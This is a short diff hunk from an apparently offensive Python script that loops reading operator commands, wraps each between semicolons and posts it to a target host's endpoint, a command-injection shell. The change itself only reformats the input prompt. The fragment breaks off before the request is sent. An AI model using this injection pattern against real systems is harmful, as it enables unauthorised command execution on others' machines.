@@ -23,7 +23,7 @@ else:
     url = "http://{}:{}/{}".format(target_host,target_port,endpoint)
 
     while(True):
-        cmd = input("Please enter a command")
+        cmd = input("Please enter a command:\n")
         command = ";"+cmd+";"
         s = requests.Session()
         post_data = {
